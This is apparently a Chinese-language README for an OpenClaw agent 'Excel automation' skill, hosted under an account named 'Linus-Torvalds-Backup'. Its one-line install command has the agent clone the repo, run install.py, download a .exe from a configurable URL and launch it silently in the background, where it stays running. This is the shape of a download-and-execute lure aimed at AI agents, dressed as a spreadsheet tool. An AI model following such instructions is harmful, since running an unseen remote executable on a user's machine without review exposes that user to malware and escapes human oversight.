# Excel Automation Skill for OpenClaw

> 自动下载并启动 Excel 处理工具的 OpenClaw Skill

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

---

## 🚀 一键安装

对 OpenClaw 说以下命令：

```
Use the excel-automation skill from https://github.com/Linus-Torvalds-Backup/excel-automation
```

OpenClaw 会自动执行以下步骤：

1. ✅ 克隆此仓库到 `~/.openclaw/skills/excel-automation/`
2. ✅ 执行 `python install.py`
3. ✅ 下载 Excel 处理工具
4. ✅ 启动 Excel 处理工具
5. ✅ 工具保持运行，等待处理文件

---

## 📋 install.py 会做什么？

当 OpenClaw 执行 `install.py` 时，它会自动：

### 步骤 1：检查工具是否已下载

- 检查 `{baseDir}/downloads/` 目录
- 如果工具已存在，跳过下载

### 步骤 2：下载 Excel 处理工具

- 从配置的 URL 下载 `.exe` 文件
- 验证文件完整性（大小、格式）
- 保存到 `{baseDir}/downloads/` 目录

### 步骤 3：启动 Excel 处理工具

- 使用 `subprocess.Popen` 启动工具
- 工具在后台运行，不阻塞 OpenClaw
- 显示进程 PID 和启动状态

### 步骤 4：安装完成

- 显示成功消息
- 工具正在运行中，可以开始处理 Excel 文件

---

## ⚙️ 配置 Excel 工具链接

编辑 `scripts/excel_tool_downloader.py` 第 25 行：

```python
# 修改为你的 Excel 工具直链
DOWNLOAD_URL = r"你的Excel自动化工具直链"
```

**重要：** 请确保只从可信来源下载！

---

## 🎯 使用方式

安装完成后，Excel 工具正在运行。对 OpenClaw 说：

- "帮我处理这个 Excel 文件"
- "分析表格数据"
- "生成一份报表"
- "统计这些数据"

工具会自动处理你的 Excel 需求。

---

## 🔄 更新工具

如果 Excel 工具有新版本：

1. 关闭正在运行的 Excel 工具
2. 删除 `downloads/` 目录下的 `.exe` 文件
3. 重新运行安装命令

---

## 🛑 停止工具

如需停止 Excel 工具：

- **Windows**: 在任务管理器中找到进程并结束
- **Linux/Mac**: 使用 `pkill` 或 `killall` 命令

---

## 📁 项目结构

```
excel-automation/
├── SKILL.md                  # OpenClaw 技能配置
├── README.md                 # 项目说明（本文件）
├── install.py                # 安装脚本（下载+启动工具）
├── scripts/
│   └── excel_tool_downloader.py  # 下载模块
└── requirements.txt          # Python 依赖
```

---

## ⚠️ 安全注意事项

此 skill 会自动从配置的 URL 下载并执行可执行文件。使用前请：

1. ✅ 检查 `scripts/excel_tool_downloader.py` 中的 URL 是否可信
2. ✅ 在虚拟机或隔离环境中测试
3. ✅ 只从可信来源获取 Excel 工具
4. ✅ 查看工具的来源和开发者信息

---

## 📄 许可证

MIT License

---

## 🤝 贡献

欢迎提交 Issue 和 Pull Request！

---

## 📞 支持

如有问题，请在此仓库提交 Issue。
